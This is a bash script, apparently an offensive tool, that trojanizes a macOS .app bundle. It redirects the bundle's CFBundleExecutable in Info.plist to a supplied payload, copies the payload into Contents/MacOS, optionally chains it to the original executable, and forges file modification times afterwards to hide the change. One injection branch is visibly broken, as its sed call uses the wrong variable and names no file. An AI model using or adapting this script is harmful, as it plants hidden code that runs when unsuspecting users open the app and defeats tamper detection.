#!/bin/bash
# License: The MIT License (MIT)
# Author Zuzzuc https://github.com/Zuzzuc/
TRUESRC=$(echo "$1" | sed 's%\\%%g') && TRUESRC=$(echo "$TRUESRC" | sed -e 's%[[:space:]]*$%%') && TRUEPATH=$(echo "$2" | sed 's%\\%%g') && TRUEPATH=$(echo "$TRUEPATH" | sed -e 's%[[:space:]]*$%%')
if [ "$1" == "" ] || [ "$2" == "" ];then
	echo "Incorrect usage"
	exit 1
else
	function Get_S {
		RS=$?
		if [ $RS -gt 0 ];then
			echo "Something went wrong. Aborting."
			exit $RS
		fi
	}
	LMTA=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC") && LMTC=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents") && LMTIP=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents/Info.plist") && LMTEF=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents/MacOS")
	if [ "$(echo ${TRUESRC: -4})" != ".app" ] || [ ! -d "$TRUESRC" ] ;then
		echo "\$1 is not an application. Aborting"
		exit 1
	fi
	if [ "$3" == "" ];then
		PayloadName=$RANDOM
	else
		if [ -f "$TRUESRC/Contents/MacOS/$3" ];then
			PayloadName=$RANDOM
		else
			PayloadName="$3"
		fi
	fi
	if [ "$4" == "" ];then
		OES=0
	elif [ "${4:0:7}" == "ToFile_" ];then
		OES=1
		OFP=$(echo "$4" | sed "s%ToFile_%%g") && OFP=$(echo "$OFP" | sed 's%\\%%g') && OFP=$(echo "$OFP" | sed -e 's%[[:space:]]*$%%')
	elif [ "$4" == "InjectInPayloadEnd" ];then
		OES=2
	elif [ "${4:0:20}" == "InjectInPayloadLine_" ];then
		OES=3
		IPL=$(echo "$4" | sed "s%InjectInPayloadLine_%%g")
	elif [ "$4" == "InjectInPayloadEndNQ" ];then
		OES=4
	else
		echo 'Incorrect usage on $4, read the README.md'
		exit 3
	fi
	AR=$(wc -l < "$TRUESRC/Contents/Info.plist")
	R=1
	chmod 755 "$TRUESRC"
	while [ $R -lt $AR ];do
		line=$(awk "FNR == $R { print; exit }" "$TRUESRC/Contents/Info.plist")
		if [ $(echo "$line" | grep -q "<key>CFBundleExecutable</key>" && echo $? || echo 1) = 0 ];then
			let R=R+1
			if [ "$OES" -gt 0 ];then
			SR=$R
			CL=$(awk "FNR == $R { print; exit }" "$TRUESRC/Contents/Info.plist") && CL=$(echo "$CL" | sed "s%.*<string>%%") && CL=$(echo "$CL" | sed "s%</string>.*%%")
			LMTOE=$(stat -f "%Sm" -t "%m%d%H%M%y" "$TRUESRC/Contents/MacOS/$CL")
				if [ "$OES" -eq 1 ];then
					echo "$CL" > "$OFP"
					Get_S
				fi
			fi
			sed -i '' -e "$R s%<string>.*</string>%<string>$PayloadName</string>%" "$TRUESRC/Contents/Info.plist"
			Get_S
			let R=AR+1
		else 
			let R=R+1
		fi
	done
	cp "$TRUEPATH" "$TRUESRC/Contents/MacOS/$PayloadName"
	Get_S
	if [ "$OES" -eq 2 ];then
		sed -i '' "\$s%\$%$CL%" "$TRUESRC/Contents/MacOS/$PayloadName"
	elif [ "$OES" -eq 3 ];then
		sed -i '' -e "$OES s%\$%$CL%"
	elif [ "$OES" -eq 4 ];then
		sed -i '' "\$s%\$%$CL\"%" "$TRUESRC/Contents/MacOS/$PayloadName"
	fi
	chmod 755 "$TRUESRC/Contents/MacOS/$PayloadName"
	touch -m "$LMTA" "$TRUESRC" && touch -m "$LMTC" "$TRUESRC/Contents" && touch -m "$LMTIP" "$TRUESRC/Contents/Info.plist" && touch -m "$LMTEF" "$TRUESRC/Contents/MacOS" && touch -m "$LMTOE" "$TRUESRC/Contents/MacOS/$PayloadName"
fi